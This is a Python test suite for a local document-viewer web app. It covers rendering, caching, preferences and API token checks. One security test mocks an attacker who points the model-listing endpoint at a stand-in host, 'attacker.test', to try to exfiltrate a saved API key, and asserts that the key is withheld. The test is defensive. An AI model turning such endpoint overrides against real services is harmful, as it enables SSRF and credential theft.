from urllib.parse import quote


def _q(path):
    return quote(str(path))


def test_health(client):
    r = client.get('/health')
    assert r.status_code == 200 and r.get_json()['status'] == 'ok'


def test_office_render_cache(tmp_path):
    """The office render cache returns the same object for an unchanged file and
    re-renders after the file changes on disk (mtime/size key)."""
    import app as app_module
    from docx import Document
    f = tmp_path / 'c.docx'
    Document().add_paragraph('one') or Document()  # noqa
    d = Document(); d.add_paragraph('one'); d.save(str(f))
    app_module._office_cache.clear()

    a = app_module._office_render(str(f))
    b = app_module._office_render(str(f))
    assert a is b                          # cache hit → identical object

    import time; time.sleep(0.01)
    d2 = Document(); d2.add_paragraph('two changed'); d2.save(str(f))   # mtime+size change
    c = app_module._office_render(str(f))
    assert c is not a                      # invalidated → fresh render
    assert 'two changed' in c['html']


def test_api_write_requires_token(client):
    """SECURITY: state-changing /api/* calls without the session token are 403;
    read GETs and token-bearing calls are allowed."""
    import app as app_module
    # No token → forbidden (override the fixture's default token header).
    r = client.post('/api/prefs', json={'kind': 'pdf', 'prefs': {}},
                    headers={'X-YR-Token': ''})
    assert r.status_code == 403
    # Wrong token → forbidden.
    r = client.post('/api/prefs', json={'kind': 'pdf', 'prefs': {}},
                    headers={'X-YR-Token': 'nope'})
    assert r.status_code == 403
    # Correct token → allowed.
    r = client.post('/api/prefs', json={'kind': 'pdf', 'prefs': {}},
                    headers={'X-YR-Token': app_module._API_TOKEN})
    assert r.status_code == 200
    # Read-only GET is not token-gated (so <img> renders keep working).
    assert client.get('/health').status_code == 200


def test_llm_probe_never_leaks_saved_api_key(client, monkeypatch):
    """SECURITY: /api/llm/models must NOT send the SAVED api_key to a
    client-chosen endpoint (SSRF + key-exfil guard)."""
    import app as app_module
    from renderers import llm
    app_module.userdata.set_setting('ai', {
        'backend': 'custom',
        'endpoint': 'https://api.openai.com/v1/chat/completions',
        'model': 'gpt', 'api_key': 'sk-SECRET-SAVED-KEY',
    })

    captured = {}

    def fake_get(url, headers=None, timeout=None):
        captured['url'] = url
        captured['headers'] = headers or {}
        raise llm.requests.RequestException('blocked in test')

    monkeypatch.setattr(llm.requests, 'get', fake_get)
    # Attacker overrides only the endpoint, supplying NO key of their own.
    r = client.post('/api/llm/models', json={'ai': {'endpoint': 'http://attacker.test/v1/chat/completions'}})
    assert r.status_code == 200            # endpoint handles the (mocked) failure gracefully
    assert captured.get('url', '').startswith('http://attacker.test')   # request did go to the chosen endpoint
    auth = captured.get('headers', {}).get('Authorization', '')
    assert 'sk-SECRET-SAVED-KEY' not in auth   # but the SAVED key was NOT attached
    assert auth == '' or 'Authorization' not in captured['headers']


def test_open_and_page_render(client, samples):
    r = client.post('/api/open', json={'path': str(samples['pdf'])})
    assert r.status_code == 200
    assert r.get_json()['doc']['kind'] == 'pdf'
    pg = client.get(f"/api/page?path={_q(samples['pdf'])}&index=0&zoom=1")
    assert pg.status_code == 200 and pg.mimetype == 'image/png'


def test_open_unsupported(client, tmp_path):
    p = tmp_path / 'x.zzz'
    p.write_bytes(b'\x00\x01\x02\x00')
    r = client.post('/api/open', json={'path': str(p)})
    assert r.status_code == 415


def test_open_missing(client):
    r = client.post('/api/open', json={'path': 'Z:\\nope.pdf'})
    assert r.status_code == 404


def test_comic_endpoints(client, samples):
    r = client.post('/api/open', json={'path': str(samples['cbz_panels'])})
    assert r.get_json()['doc']['kind'] == 'comic'
    assert client.get(f"/api/comic-page?path={_q(samples['cbz_panels'])}&index=0").status_code == 200
    pn = client.get(f"/api/comic-panels?path={_q(samples['cbz_panels'])}&index=0").get_json()
    assert pn['count'] == 4


def test_office_text_image(client, samples):
    assert client.get(f"/api/office?path={_q(samples['pptx'])}").get_json()['html']
    assert client.get(f"/api/text?path={_q(samples['md'])}").get_json()['mode'] == 'markdown'
    assert client.get(f"/api/image?path={_q(samples['png'])}").status_code == 200


def test_recent_and_prefs(client, samples):
    client.post('/api/open', json={'path': str(samples['pdf'])})
    recent = client.get('/api/recent').get_json()['recent']
    assert any(r['path'] == str(samples['pdf']) for r in recent)
    client.post('/api/prefs', json={'kind': 'comic', 'prefs': {'fit': 'width'}})
    assert client.get('/api/prefs?kind=comic').get_json()['prefs']['fit'] == 'width'


def test_file_prefs_roundtrip(client, samples):
    client.post('/api/file-prefs', json={'path': str(samples['cbz']), 'prefs': {'dir': 'rtl'}})
    r = client.post('/api/open', json={'path': str(samples['cbz'])})
    assert r.get_json()['doc']['file_prefs']['dir'] == 'rtl'


def test_doc_text(client, samples):
    r = client.get(f"/api/doc-text?path={_q(samples['pdf'])}&start=0&end=3")
    assert r.status_code == 200
    j = r.get_json()
    assert j['page_count'] == 3 and 'fox' in j['text'].lower()
    assert client.get('/api/doc-text').status_code == 400
